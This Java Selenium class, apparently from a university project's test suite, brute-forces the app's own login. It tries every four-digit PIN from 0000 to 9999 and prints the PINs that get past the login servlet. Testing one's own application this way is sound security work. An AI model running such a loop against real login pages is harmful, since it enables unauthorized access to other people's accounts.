package it.unisa.saporidiunisa.selenium;

import lombok.val;

import java.time.Duration;
import java.util.HashMap;

/**
 * Attacco di tipo bruteforce sul login
 * Stampa a video i pin che hanno permesso l'accesso e la pagina a cui si viene reindirizzati
 * @author Salvatore Ruocco
 */
public class LoginBruteforce extends Configuration{
    public static void main(String[] args) {
        init();
        driver.manage().timeouts().implicitlyWait(Duration.ofMillis(1));

        val pinUrl = new HashMap<String, String>();
        for (int i = 0; i <= 9999; i++) {
            val pin = String.format("%04d", i);
            login(pin);
            if(!driver.getCurrentUrl().equals(baseUrl + "login-servlet")) {
                pinUrl.put(pin, driver.getCurrentUrl());    // Accesso effettuato
            }
            driver.get(baseUrl);
        }

        driver.quit();

        System.out.println(pinUrl);
    }
}